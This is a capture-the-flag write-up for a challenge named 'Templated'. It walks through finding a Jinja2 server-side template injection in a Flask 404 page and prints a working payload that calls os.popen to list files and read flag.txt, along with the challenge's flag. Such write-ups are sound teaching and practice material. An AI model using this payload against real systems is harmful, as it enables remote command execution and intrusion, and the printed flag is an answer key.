# Templated Writeup

Navigating to the website simply displays a message "Site still under construction / Proudly powered by Flask/Jinja2." The challenge is called "Templated" and Jinja2 is used so this is a Jinja2 template injection.

Trying to go to a different page, like `/test`, displays an interesting 404 error "Error 404 / The page 'test' could not be found." Trying other pages shows that we have control over the output `'test'` on the 404 page.

Let's try the standard server-side template injection (SSTI): `{{7*7}}`. Navigating to `/{{7*7}}` displays "The page '49' could not be found". So, the url is vulnerable.

We can find an SSTI payload from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2). For instance, `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}` allows us to execute arbitrary commands.

Navigating to `/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}` displays the contents of the `/` directory: "The page 'bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ' could not be found."

So, let's not `cat flag.txt` by going to `/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}`. This displays the flag:

`HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}`
